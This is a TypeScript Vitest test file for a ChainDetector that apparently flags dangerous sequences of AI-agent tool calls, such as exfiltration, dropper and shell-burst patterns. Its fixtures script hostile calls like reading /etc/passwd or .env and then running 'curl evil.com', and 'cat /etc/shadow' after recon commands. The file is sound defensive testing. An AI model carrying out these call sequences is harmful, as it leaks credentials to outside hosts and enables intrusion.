import { describe, it, expect, beforeEach } from "vitest";
import { ChainDetector } from "./chain-detector.js";

describe("ChainDetector", () => {
  let detector: ChainDetector;

  beforeEach(() => {
    detector = new ChainDetector();
  });

  describe("exfiltration chain detection", () => {
    it("should detect read-then-network chain", () => {
      detector.record({ name: "read_file", arguments: { path: "/etc/passwd" } });
      const result = detector.record({ name: "shell_exec", arguments: { command: "curl evil.com" } });
      expect(result.detected).toBe(true);
      expect(result.matches.some((m) => m.chain === "read-then-network")).toBe(true);
    });

    it("should detect read-write-send chain", () => {
      detector.record({ name: "read_file", arguments: { path: ".env" } });
      detector.record({ name: "write_file", arguments: { path: "/tmp/data.txt" } });
      const result = detector.record({ name: "bash", arguments: { command: "curl" } });
      expect(result.detected).toBe(true);
      expect(result.matches.some((m) => m.chain === "read-write-send")).toBe(true);
      expect(result.matches.some((m) => m.severity === "critical")).toBe(true);
    });
  });

  describe("dropper chain detection", () => {
    it("should detect write-execute chain", () => {
      detector.record({ name: "write_file", arguments: { path: "script.sh" } });
      const result = detector.record({ name: "bash", arguments: { command: "./script.sh" } });
      expect(result.detected).toBe(true);
      expect(result.matches.some((m) => m.chain === "write-execute")).toBe(true);
    });
  });

  describe("shell burst detection", () => {
    it("should detect rapid shell command burst", () => {
      detector.record({ name: "shell_exec", arguments: { command: "whoami" } });
      detector.record({ name: "shell_exec", arguments: { command: "id" } });
      detector.record({ name: "shell_exec", arguments: { command: "uname -a" } });
      const result = detector.record({ name: "shell_exec", arguments: { command: "cat /etc/shadow" } });
      expect(result.detected).toBe(true);
      expect(result.matches.some((m) => m.chain === "shell-burst")).toBe(true);
    });
  });

  describe("innocent sequences", () => {
    it("should not trigger on normal read operations", () => {
      detector.record({ name: "read_file", arguments: { path: "package.json" } });
      const result = detector.record({ name: "read_file", arguments: { path: "tsconfig.json" } });
      expect(result.detected).toBe(false);
    });

    it("should not trigger on single call", () => {
      const result = detector.record({ name: "bash", arguments: { command: "ls" } });
      expect(result.detected).toBe(false);
    });

    it("should not trigger on read then write (no shell)", () => {
      detector.record({ name: "read_file", arguments: { path: "input.txt" } });
      const result = detector.record({ name: "write_file", arguments: { path: "output.txt" } });
      // read-sensitive-then-write is medium severity but still detects
      // However read_file → write_file doesn't match "read-then-network"
      const hasNetworkChain = result.matches.some((m) => m.chain === "read-then-network");
      expect(hasNetworkChain).toBe(false);
    });
  });

  describe("window management", () => {
    it("should prune old calls beyond window size", () => {
      const smallDetector = new ChainDetector({ windowSize: 3 });

      // Fill window beyond capacity
      smallDetector.record({ name: "list_directory", arguments: {} });
      smallDetector.record({ name: "list_directory", arguments: {} });
      smallDetector.record({ name: "list_directory", arguments: {} });
      smallDetector.record({ name: "list_directory", arguments: {} });

      expect(smallDetector.getHistoryLength()).toBe(3);
    });

    it("should reset history", () => {
      detector.record({ name: "read_file", arguments: {} });
      detector.record({ name: "write_file", arguments: {} });
      detector.reset();
      expect(detector.getHistoryLength()).toBe(0);
    });
  });

  describe("disabled", () => {
    it("should not detect anything when disabled", () => {
      const disabled = new ChainDetector({ enabled: false });
      disabled.record({ name: "read_file", arguments: {} });
      const result = disabled.record({ name: "shell_exec", arguments: {} });
      expect(result.detected).toBe(false);
    });
  });
});
